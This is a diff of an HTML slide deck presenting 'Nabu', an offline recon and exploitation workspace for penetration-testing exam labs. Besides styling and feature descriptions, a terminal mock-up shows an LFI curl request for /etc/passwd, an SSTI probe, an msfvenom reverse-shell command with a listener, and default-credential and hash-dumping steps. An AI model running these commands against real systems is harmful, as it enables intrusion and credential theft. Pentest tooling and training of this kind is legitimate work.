@@ -17,54 +17,46 @@
  --teal-soft:rgba(63,111,116,.12);}
 *{box-sizing:border-box}
 html,body{margin:0;height:100%}
-body{background:var(--ink);color:var(--text);font-family:var(--sans);
- -webkit-font-smoothing:antialiased;overflow:hidden}
+body{background:var(--ink);color:var(--text);font-family:var(--sans);-webkit-font-smoothing:antialiased;overflow:hidden}
 .deck{height:100vh;display:flex;flex-direction:column}
-.bar{display:flex;align-items:center;gap:14px;padding:9px 20px;border-bottom:1px solid var(--border);
- background:var(--surface);flex:0 0 auto}
+.bar{display:flex;align-items:center;gap:14px;padding:9px 20px;border-bottom:1px solid var(--border);background:var(--surface);flex:0 0 auto}
 .brand{display:flex;align-items:center;gap:10px;font-weight:700}
-.owl{width:30px;height:30px;border-radius:8px;background:var(--gold-soft);border:1px solid var(--gold);
- display:grid;place-items:center;color:var(--gold);font-size:15px}
+.owl{width:30px;height:30px;border-radius:8px;background:var(--gold-soft);border:1px solid var(--gold);display:grid;place-items:center;color:var(--gold);font-size:15px}
 .brand .tag{color:var(--muted);font-weight:500;font-size:12.5px}
 .bar .spacer{flex:1}
-.bar button{background:var(--surface-2);color:var(--text);border:1px solid var(--border);
- border-radius:8px;padding:6px 12px;font:inherit;font-size:13px;cursor:pointer}
+.bar button{background:var(--surface-2);color:var(--text);border:1px solid var(--border);border-radius:8px;padding:6px 12px;font:inherit;font-size:13px;cursor:pointer}
 .bar button:hover{border-color:var(--gold)}
-.counter{color:var(--muted);font-variant-numeric:tabular-nums;font-size:13px;min-width:52px;text-align:center}
+.counter{color:var(--muted);font-variant-numeric:tabular-nums;font-size:13px;min-width:56px;text-align:center}
 .progress{height:3px;background:var(--border);flex:0 0 auto}
 .progress > i{display:block;height:100%;background:var(--gold);width:0;transition:width .35s ease}
 .stage{flex:1;position:relative;overflow:hidden}
-.slide{position:absolute;inset:0;padding:26px 5vw 44px;display:flex;flex-direction:column;
- opacity:0;transform:translateY(14px);pointer-events:none;transition:opacity .4s ease,transform .4s ease;overflow:auto}
+.slide{position:absolute;inset:0;padding:24px 5vw 42px;display:flex;flex-direction:column;opacity:0;transform:translateY(14px);pointer-events:none;transition:opacity .4s ease,transform .4s ease;overflow:auto}
 .slide.active{opacity:1;transform:none;pointer-events:auto}
-.eyebrow{color:var(--teal);font-weight:700;letter-spacing:.14em;text-transform:uppercase;font-size:11.5px;margin-bottom:7px}
+.eyebrow{color:var(--teal);font-weight:700;letter-spacing:.14em;text-transform:uppercase;font-size:11.5px;margin-bottom:6px}
 .eyebrow .new{color:var(--gold);border:1px solid var(--gold);border-radius:4px;padding:1px 6px;margin-left:8px;font-size:10.5px}
 h1{font-family:var(--serif);font-size:clamp(30px,4.4vw,54px);line-height:1.06;margin:0 0 14px;font-weight:600;text-wrap:balance}
-h2{font-family:var(--serif);font-size:clamp(22px,2.9vw,36px);line-height:1.12;margin:0 0 6px;font-weight:600;text-wrap:balance}
+h2{font-family:var(--serif);font-size:clamp(21px,2.8vw,34px);line-height:1.12;margin:0 0 6px;font-weight:600;text-wrap:balance}
 .lede{font-size:clamp(15px,1.5vw,20px);color:var(--muted);max-width:62ch;line-height:1.5;margin:0 0 14px}
 .center{align-items:center;justify-content:center;text-align:center}
 .center .lede{margin-left:auto;margin-right:auto}
 b,strong{color:var(--text)} .gold{color:var(--gold)}
-/* two-column: figure + points */
-.body{display:grid;grid-template-columns:1.35fr 1fr;gap:30px;align-items:center;flex:1;min-height:0}
+.body{display:grid;grid-template-columns:1.32fr 1fr;gap:28px;align-items:center;flex:1;min-height:0}
 .body.even{grid-template-columns:1fr 1fr}
 @media(max-width:940px){.body{grid-template-columns:1fr;gap:16px}}
-/* image-dominant showcase */
 .showcase{display:flex;flex-direction:column;gap:14px;flex:1;min-height:0;align-items:center}
 .showcase .shot{max-width:min(100%,1080px)}
 .showcase .shot img{max-height:52vh;width:auto;max-width:100%}
 .prow{display:flex;gap:22px;flex-wrap:wrap;justify-content:center;width:100%;max-width:1080px}
-.prow .p{flex:1 1 210px;max-width:320px}
+.prow .p{flex:1 1 210px;max-width:330px}
 .prow .p .h{color:var(--gold);font-weight:700;display:block;margin-bottom:2px;font-size:14.5px}
 .prow .p small{color:var(--muted);font-size:13px;line-height:1.42}
-.shot{border:1px solid var(--border);border-radius:12px;overflow:hidden;background:var(--surface);
- box-shadow:0 16px 42px rgba(0,0,0,.42)}
+.shot{border:1px solid var(--border);border-radius:12px;overflow:hidden;background:var(--surface);box-shadow:0 16px 42px rgba(0,0,0,.42)}
 .shot img{display:block;width:100%;height:auto}
+.body .shot img{max-height:63vh;object-fit:contain}
 .shot .cap{padding:7px 12px;border-top:1px solid var(--border);color:var(--muted);font-size:12.5px;background:var(--surface-2)}
-ul.points{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:13px}
-ul.points li{position:relative;padding-left:28px;font-size:clamp(14px,1.45vw,17.5px);line-height:1.42}
-ul.points li::before{content:"";position:absolute;left:0;top:.42em;width:11px;height:11px;border-radius:3px;
- background:var(--gold);box-shadow:0 0 0 4px var(--gold-soft)}
+ul.points{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:12px}
+ul.points li{position:relative;padding-left:28px;font-size:clamp(14px,1.42vw,17px);line-height:1.4}
+ul.points li::before{content:"";position:absolute;left:0;top:.42em;width:11px;height:11px;border-radius:3px;background:var(--gold);box-shadow:0 0 0 4px var(--gold-soft)}
 ul.points li .h{color:var(--text);font-weight:700} ul.points li small{color:var(--muted)}
 .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;width:100%;max-width:940px;margin:6px auto 0}
 @media(max-width:820px){.stats{grid-template-columns:repeat(2,1fr)}}
@@ -74,8 +66,7 @@ ul.points li .h{color:var(--text);font-weight:700} ul.points li small{color:var(
 .chips{display:flex;flex-wrap:wrap;gap:7px;max-width:60ch}
 .chip{background:var(--surface-2);border:1px solid var(--border);border-radius:999px;padding:5px 12px;font-size:13px;color:var(--text)}
 .chip.hot{border-color:var(--gold);color:var(--gold)}
-.note{background:var(--teal-soft);border:1px solid var(--teal);border-left-width:4px;border-radius:10px;
- padding:14px 16px;font-size:14.5px;line-height:1.5;max-width:64ch}
+.note{background:var(--teal-soft);border:1px solid var(--teal);border-left-width:4px;border-radius:10px;padding:14px 16px;font-size:14.5px;line-height:1.5;max-width:64ch}
 .note.warn{background:var(--gold-soft);border-color:var(--gold)}
 .note .t{display:block;font-weight:700;margin-bottom:4px;color:var(--text)}
 .legal{display:grid;grid-template-columns:1fr 1fr;gap:12px;width:100%}
@@ -84,13 +75,15 @@ ul.points li .h{color:var(--text);font-weight:700} ul.points li small{color:var(
 .legal .box h4{margin:0 0 7px;font-size:13px} .legal .box.yes h4{color:var(--green)} .legal .box.no h4{color:var(--red)}
 .legal .box ul{margin:0;padding-left:16px;line-height:1.5;font-size:12.5px;color:var(--muted)}
 .legal .box ul b{color:var(--text)}
+.tier{display:flex;gap:10px;align-items:flex-start;margin-bottom:11px}
+.tier .b{flex:0 0 auto;font-size:11px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;padding:3px 9px;border-radius:6px;border:1px solid;margin-top:2px}
+.tier .b.a{color:var(--green);border-color:var(--green)}.tier .b.s{color:var(--gold);border-color:var(--gold)}.tier .b.o{color:var(--red);border-color:var(--red)}
+.tier .d{font-size:14px;line-height:1.4} .tier .d b{color:var(--text)} .tier .d small{color:var(--muted)}
+.term{font-family:var(--mono);font-size:13px;background:#0b0f18;border:1px solid var(--border);border-radius:10px;padding:15px 17px;line-height:1.55;overflow:auto;box-shadow:0 16px 42px rgba(0,0,0,.42);width:100%}
+.term .c{color:var(--teal)} .term .pr{color:var(--gold)} .term .g{color:var(--green)} .term .m{color:var(--muted)}
 .kbd{font-family:var(--mono);font-size:12px;background:var(--surface-2);border:1px solid var(--border);border-radius:5px;padding:1px 6px}
 .hintbar{position:absolute;bottom:10px;left:0;right:0;text-align:center;color:var(--muted);font-size:12px;pointer-events:none}
-/* big edge navigation arrows */
-.nav-arrow{position:absolute;top:50%;transform:translateY(-50%);z-index:20;width:52px;height:52px;
- border-radius:50%;border:1px solid var(--border);background:var(--surface-2);color:var(--text);
- font-size:30px;line-height:1;font-family:var(--serif);display:grid;place-items:center;cursor:pointer;
- box-shadow:0 6px 20px rgba(0,0,0,.28);transition:opacity .2s,border-color .2s,color .2s,transform .12s}
+.nav-arrow{position:absolute;top:50%;transform:translateY(-50%);z-index:20;width:52px;height:52px;border-radius:50%;border:1px solid var(--border);background:var(--surface-2);color:var(--text);font-size:30px;line-height:1;font-family:var(--serif);display:grid;place-items:center;cursor:pointer;box-shadow:0 6px 20px rgba(0,0,0,.28);transition:opacity .2s,border-color .2s,color .2s,transform .12s}
 .nav-arrow:hover{border-color:var(--gold);color:var(--gold)}
 .nav-arrow:active{transform:translateY(-50%) scale(.94)}
 .nav-arrow.left{left:18px}.nav-arrow.right{right:18px}
@@ -104,18 +97,16 @@ ul.points li .h{color:var(--text);font-weight:700} ul.points li small{color:var(
 <body>
 <div class="deck">
   <div class="bar">
-    <div class="brand"><span class="owl">{o,o}</span>
-      <div>Nabu — <span class="tag">Local Recon &amp; Exploitation Workspace</span></div></div>
+    <div class="brand"><span class="owl">{o,o}</span><div>Nabu — <span class="tag">Local Recon &amp; Exploitation Workspace</span></div></div>
     <div class="spacer"></div>
     <button id="autoplay" type="button">▶ Autoplay</button>
     <button id="theme" type="button">◐ Theme</button>
-    <span class="counter"><span id="cur">1</span> / <span id="tot">14</span></span>
+    <span class="counter"><span id="cur">1</span> / <span id="tot">20</span></span>
   </div>
   <div class="progress"><i id="bar"></i></div>
   <div class="stage" id="stage">
     <button class="nav-arrow left" id="navPrev" type="button" aria-label="Previous slide"><span>‹</span></button>
     <button class="nav-arrow right" id="navNext" type="button" aria-label="Next slide"><span>›</span></button>
-    <!-- slides injected -->
   </div>
 </div>
 
@@ -131,24 +122,38 @@ const SLIDES = [
     <p class="lede">One local workspace that discovers a box, enumerates every service, maps the attack
       surface, pivots across internal networks — and now <b>attacks</b>, one human-confirmed command at a
       time. Exam-legal by default, offline, no AI.</p>
-    <p class="lede" style="font-size:14px">Click the <span class="gold">‹ ›</span> arrows or use
-      <span class="kbd">→</span> / <span class="kbd">←</span> · <span class="kbd">F</span> fullscreen</p>`},
+    <p class="lede" style="font-size:14px">20 slides · click the <span class="gold">‹ ›</span> arrows or use
+      <span class="kbd">→</span>/<span class="kbd">←</span> · <span class="kbd">F</span> fullscreen · <span class="kbd">▶</span> autoplay</p>`},
 
-  // 2 — the workspace (RECON)
+  // 2 — workspace dashboard
+  {cls:"", html:`
+    <div class="eyebrow">Start · the workspace</div>
+    <h2>Every box is a self-contained project.</h2>
+    <div class="body even">
+      ${S("dashboard-empty.png","The workspace dashboard")}<div class="cap">Workspace · a searchable, filterable table of every engagement</div></div>
+      <ul class="points">
+        <li><span class="h">One folder per box.</span> <small>Services, findings, creds, notes, graph, report — reopen it and the whole state comes back.</small></li>
+        <li><span class="h">Find it fast.</span> <small>Search and filter by name, IP, platform or status; open-by-IP when you forget the name.</small></li>
+        <li><span class="h">Safe to run many.</span> <small>Profile locks + stale-lock recovery; a second window opens read-only.</small></li>
+        <li><span class="h">Portable.</span> <small>Import / export a project as a <span class="kbd">.tar.gz</span> to move it between machines.</small></li>
+      </ul>
+    </div>`},
+
+  // 3 — three-pane workspace
   {cls:"", html:`
     <div class="eyebrow">The workspace</div>
     <h2>Everything for one box, in one window.</h2>
-    <div class="body wide-left">
-      ${S("shell-dark.png","Nabu's three-pane recon workspace")}<div class="cap">Recon tab · a scanned box: service tree, tool builder, live HackTricks &amp; Exploit-DB</div></div>
+    <div class="body">
+      ${S("shell-dark.png","Nabu's three-pane recon workspace")}<div class="cap">Recon tab · service tree · command builder · live HackTricks &amp; Exploit-DB</div></div>
       <ul class="points">
         <li><span class="h">Left: your services.</span> <small>Every open port, TCP + UDP, click to drive its module.</small></li>
         <li><span class="h">Middle: the command builder.</span> <small>Dropdowns &amp; sliders build the exact tool command — you press Run.</small></li>
-        <li><span class="h">Right: references, offline.</span> <small>The matching HackTricks page (bundled) + a version-aware Exploit-DB lookup.</small></li>
+        <li><span class="h">Right: references, offline.</span> <small>The matching HackTricks page + a version-aware Exploit-DB lookup.</small></li>
         <li><span class="h">Rail: the whole workflow.</span> <small>Workspace · Recon · Graph · Findings · Credentials · Notes · Report.</small></li>
       </ul>
     </div>`},
 
-  // 3 — discover
+  // 4 — discover
   {cls:"", html:`
     <div class="eyebrow">Discover</div>
     <h2>Staged nmap → every port, versioned.</h2>
@@ -162,7 +167,7 @@ const SLIDES = [
       </ul>
     </div>`},
 
-  // 4 — enumerate per service
+  // 5 — HTTP per-service builder
   {cls:"", html:`
     <div class="eyebrow">Enumerate · per service</div>
     <h2>Each service, its own module — granular.</h2>
@@ -170,15 +175,43 @@ const SLIDES = [
       ${S("http-panel.png","The HTTP module command builder")}<div class="cap">HTTP module · feroxbuster with a live command preview (port-80 content discovery)</div></div>
       <ul class="points">
         <li><span class="h">Build it with dropdowns.</span> <small>Wordlist, extensions, threads, depth, status codes — the exact command, previewed.</small></li>
-        <li><span class="h">Tiered &amp; safe.</span> <small>Auto read-only checks · one-click default-cred checks · opt-in spray (off by default).</small></li>
-        <li><span class="h">SMB, FTP, LDAP, DBs…</span> <small>Every service has this same builder + a Manual Follow-ups tab.</small></li>
+        <li><span class="h">Reproduce any tool.</span> <small>Swap feroxbuster → gobuster / ffuf / dirsearch; the flags translate.</small></li>
+        <li><span class="h">Non-standard HTTP ports.</span> <small>Every http-flagged port gets its own node and output subtree.</small></li>
         <li><span class="h">Copy or Run.</span> <small>Dry-run to preview, Run to execute, Add-to-report to keep it.</small></li>
       </ul>
     </div>`},
 
-  // 5 — findings + references  (was text-only — now a real screenshot)
+  // 6 — SMB tiered recon (the safety model)
   {cls:"", html:`
-    <div class="eyebrow">Analyze · findings &amp; references</div>
+    <div class="eyebrow">Enumerate · the safety model</div>
+    <h2>Three tiers, clearly separated.</h2>
+    <div class="body">
+      ${S("smb-tool-panel.png","The SMB tiered-recon panel")}<div class="cap">SMB · one click runs the full Tier-1 recon; Tier-2 waits for you; Tier-3 stays off</div></div>
+      <div>
+        <div class="tier"><span class="b a">Auto</span><div class="d"><b>Read-only enumeration.</b> <small>Null session, guest, shares, users, RID cycling — runs on one click, streams to files.</small></div></div>
+        <div class="tier"><span class="b s">Shown</span><div class="d"><b>Single default-cred checks.</b> <small><span class="kbd">administrator:''</span>, <span class="kbd">sa:sa</span> — pre-filled in Manual Follow-ups; <b>you</b> click Run.</small></div></div>
+        <div class="tier"><span class="b o">Opt-in</span><div class="d"><b>List-driven spraying.</b> <small>Off by default; enabled only in Spray mode, against your own target.</small></div></div>
+        <p class="lede" style="font-size:14px;margin:6px 0 0">Anonymous / null-session wins auto-record to the credential vault.</p>
+      </div>
+    </div>`},
+
+  // 7 — references offline
+  {cls:"", html:`
+    <div class="eyebrow">Reference · offline-first</div>
+    <h2>HackTricks &amp; Exploit-DB, right beside the service.</h2>
+    <div class="body even">
+      ${S("reference-offline.png","The offline reference pane")}<div class="cap">Reference pane · the mapped HackTricks page, bundled offline · version-aware searchsploit</div></div>
+      <ul class="points">
+        <li><span class="h">Works with no internet.</span> <small>A build-time HackTricks snapshot is bundled; an optional live copy caches for later.</small></li>
+        <li><span class="h">Finding-aware.</span> <small>Jumps to the section that matches what was actually found on the box.</small></li>
+        <li><span class="h">Version-aware Exploit-DB.</span> <small>searchsploit by product + <span class="kbd">major.minor</span>, matched hits ranked first, capped with an "N of M" note.</small></li>
+        <li><span class="h">Lookup only.</span> <small>Exploit-DB is never downloaded, transformed, or run — a pointer to read.</small></li>
+      </ul>
+    </div>`},
+
+  // 8 — findings
+  {cls:"", html:`
+    <div class="eyebrow">Analyze · findings</div>
     <h2>Structured findings — never over-claimed.</h2>
     <div class="body even">
       ${S("findings.png","The findings view")}<div class="cap">Findings · parsed facts with a conservative severity — an open port is never a "vuln"</div></div>
@@ -186,11 +219,25 @@ const SLIDES = [
         <li><span class="h">Facts, not raw text.</span> <small>Users, shares, versions, misconfigs — parsed into structured findings.</small></li>
         <li><span class="h">Conservative by design.</span> <small>Only real weak postures (null session, SMB signing off) are flagged notable.</small></li>
         <li><span class="h">Visible failures.</span> <small>A blocked/missing tool says <span class="kbd">⚠ step did not run</span> — never a silent gap.</small></li>
-        <li><span class="h">References inline.</span> <small>Offline HackTricks + version-aware Exploit-DB, right beside the service.</small></li>
+        <li><span class="h">Sourced next steps.</span> <small>A pattern library suggests recon moves, each cited from a real box — pre-fill only.</small></li>
       </ul>
     </div>`},
 
-  // 6 — attack surface graph
+  // 9 — credential vault + spray
+  {cls:"", html:`
+    <div class="eyebrow">Credentials</div>
+    <h2>One vault feeds everything.</h2>
+    <div class="body even">
+      ${S("credential-vault.png","The credential vault dialog")}<div class="cap">Credential vault · <span class="kbd">creds.json</span> at 0600 — every module and attack draws from it</div></div>
+      <ul class="points">
+        <li><span class="h">Durable &amp; local.</span> <small>Stored at mode 0600; anonymous wins auto-record; secrets redacted in recon reports.</small></li>
+        <li><span class="h">Consumed everywhere.</span> <small>LDAP, WinRM, MSSQL and the Exploitation tab pre-fill from it — no re-typing.</small></li>
+        <li><span class="h">OSCP-legal spraying, opt-in.</span> <small>hydra / netexec across SMB·SSH·FTP·WinRM — off by default, target-scoped, you confirm.</small></li>
+        <li><span class="h">Loot writes back.</span> <small>Dumped hashes/creds from the Exploitation tab land here for the next move.</small></li>
+      </ul>
+    </div>`},
+
+  // 10 — attack surface graph
   {cls:"", html:`
     <div class="eyebrow">Present · the graph</div>
     <h2>The whole box as one map.</h2>
@@ -203,7 +250,7 @@ const SLIDES = [
       </div>
     </div>`},
 
-  // 7 — DANTE multi-network pivot (rich!)
+  // 11 — DANTE pivots
   {cls:"", html:`
     <div class="eyebrow">Present · multi-network pivots</div>
     <h2>One project — the entire internal engagement.</h2>
@@ -216,7 +263,7 @@ const SLIDES = [
       </div>
     </div>`},
 
-  // 8 — report
+  // 12 — report
   {cls:"", html:`
     <div class="eyebrow">Present · the report</div>
     <h2>Obsidian-ready, nothing hidden.</h2>
@@ -230,26 +277,26 @@ const SLIDES = [
       </ul>
     </div>`},
 
-  // 9 — EXPLOITATION tab (NEW)
+  // 13 — EXPLOITATION tab
   {cls:"", html:`
     <div class="eyebrow">New <span class="new">since Jul 15</span> · the Exploitation tab</div>
     <h2>Now: work the surface — you attack.</h2>
-    <div class="body wide-left">
+    <div class="body">
       ${S("exploit-panel.png","The Exploitation tab, port-80 web attacks")}<div class="cap">Exploitation tab · a web box · LFI/SSTI/RCE/upload → a filled command ready to Run ▸</div></div>
       <ul class="points">
         <li><span class="h">Your services first.</span> <small>Marked ● and sorted to the top — this is the port-80 web playbook.</small></li>
         <li><span class="h">Pre-filled for you.</span> <small>Target, port, a vault credential — dropped straight into each command.</small></li>
         <li><span class="h">One click to a command.</span> <small>Copy it, or press <b>Run ▸</b>. Attacker-side runs; victim-side is copy-only.</small></li>
-        <li><span class="h">Loot loops back.</span> <small>Parse pulls dumped hashes/creds into the vault for the next move.</small></li>
+        <li><span class="h">Organized like recon.</span> <small>Category tree: LFI, SSTI, command injection, upload→shell, deserialization, reverse shells.</small></li>
       </ul>
     </div>`},
 
-  // 10 — across every service (AD shot + breadth)
+  // 14 — breadth (AD shot)
   {cls:"", html:`
     <div class="eyebrow">New <span class="new">since Jul 15</span> · breadth</div>
     <h2>182 services. 2,244 ready-to-run actions.</h2>
-    <div class="body wide-left">
-      ${S("exploit-panel-ad.png","The Exploitation tab against Active Directory")}<div class="cap">Same tab, an AD box · secretsdump filled from a vault credential — impacket, evil-winrm, PtH</div></div>
+    <div class="body">
+      ${S("exploit-panel-ad.png","The Exploitation tab against Active Directory")}<div class="cap">Same tab, an AD box · secretsdump filled from a vault cred — impacket, evil-winrm, PtH</div></div>
       <div>
         <p class="lede" style="font-size:15px;margin-bottom:12px">Mined from your vault by a gap-analysis workflow across 13 reviewed batches — every service you meet:</p>
         <div class="chips">
@@ -262,7 +309,21 @@ const SLIDES = [
       </div>
     </div>`},
 
-  // 11 — the guardrail (run-confirm dialog — NEW)
+  // 15 — parse loot -> vault
+  {cls:"", html:`
+    <div class="eyebrow">New <span class="new">since Jul 15</span> · loot</div>
+    <h2>Run → Parse → loot → back to the vault.</h2>
+    <div class="body">
+      ${S("exploit-loot.png","The Exploitation tab loot table after parsing secretsdump")}<div class="cap">Paste or stream output → Parse → dumped secrets (shown in full — your own capture) → Add to vault</div></div>
+      <ul class="points">
+        <li><span class="h">It reads the output for you.</span> <small>secretsdump / kerberoast / cleartext — hashes &amp; creds parsed into a loot table.</small></li>
+        <li><span class="h">Shown in full.</span> <small>This is your own dumped loot — not redacted here, so you can use it.</small></li>
+        <li><span class="h">One click to the vault.</span> <small>Add-to-vault writes them into <span class="kbd">creds.json</span> for the next service.</small></li>
+        <li><span class="h">Audited raw.</span> <small>Exploit commands are logged in full; recon-side redaction is unchanged.</small></li>
+      </ul>
+    </div>`},
+
+  // 16 — guardrail
   {cls:"", html:`
     <div class="eyebrow">New <span class="new">since Jul 15</span> · the guardrail</div>
     <h2>Nothing auto-runs. You confirm every attack.</h2>
@@ -280,7 +341,7 @@ const SLIDES = [
       </div>
     </div>`},
 
-  // 12 — msfvenom
+  // 17 — msfvenom
   {cls:"", html:`
     <div class="eyebrow">New <span class="new">since Jul 15</span> · payloads</div>
     <h2>Never fight the reverse-shell syntax again.</h2>
@@ -290,11 +351,35 @@ const SLIDES = [
         <li><span class="h">Pick, don't memorize.</span> <small>Platform → payload → format; LHOST auto-fills from tun0.</small></li>
         <li><span class="h">Command + listener together.</span> <small><span class="kbd">nc -lvnp</span> for stageless, <span class="kbd">multi/handler</span> for staged.</small></li>
         <li><span class="h">Exam-safe by default.</span> <small>Non-meterpreter <span class="kbd">*_reverse_tcp</span>; meterpreter is flagged one-use.</small></li>
-        <li><span class="h">Copy-only.</span> <small>It builds the syntax; you run it. Bad chars are shell-quoted.</small></li>
+        <li><span class="h">Copy-only.</span> <small>It builds the syntax; you run it. Bad chars are shell-quoted so <span class="kbd">\\x00</span> survives.</small></li>
       </ul>
     </div>`},
 
-  // 13 — built carefully (stats + audit shot)
+  // 18 — headless CLI
+  {cls:"", html:`
+    <div class="eyebrow">Scriptable · headless</div>
+    <h2>The whole engine, from the terminal.</h2>
+    <div class="body">
+      <div class="term">
+        <span class="c"># the exact attack syntax, filled — display only</span><br>
+        <span class="pr">$</span> nabu-cli exploit web<br>
+        <span class="m">[RUN ]</span> LFI → /etc/passwd  ·  <span class="m">[RUN ]</span> SSTI {{7*7}} → RCE<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;curl -sk "http://target/../../../../etc/passwd"<br><br>
+        <span class="c"># build a payload + its listener</span><br>
+        <span class="pr">$</span> nabu-cli payload win-x64-stageless <span class="g">-l 10.10.14.7 -P 443</span><br>
+        <span class="m"># generate (on Kali):</span><br>
+        msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=10.10.14.7 LPORT=443 -f exe -o shell.exe<br>
+        <span class="m"># catch the shell:</span> &nbsp;nc -lvnp 443
+      </div>
+      <ul class="points">
+        <li><span class="h">Same engine, no GUI.</span> <small><span class="kbd">nabu-cli scan</span>, <span class="kbd">exploit</span>, <span class="kbd">payload</span>, <span class="kbd">doctor</span> — for scripting &amp; tests.</small></li>
+        <li><span class="h">Display-only exploit view.</span> <small>Shows RUN vs COPY per action; you still run it yourself.</small></li>
+        <li><span class="h">Host check built in.</span> <small><span class="kbd">nabu-cli doctor</span> reports any missing wrapped tool + its install command.</small></li>
+        <li><span class="h">Clean output.</span> <small>The owl banner is TTY-only, so pipes and tests stay tidy.</small></li>
+      </ul>
+    </div>`},
+
+  // 19 — quality
   {cls:"", html:`
     <div class="eyebrow">Built carefully</div>
     <h2>182 services — and every one verified.</h2>
@@ -311,7 +396,7 @@ const SLIDES = [
       </div>
     </div>`},
 
-  // 14 — for the team
+  // 20 — closer
   {cls:"center", html:`
     <div class="eyebrow">For the team</div>
     <h1>Scan a box. Switch tabs. <span class="gold">Go.</span></h1>
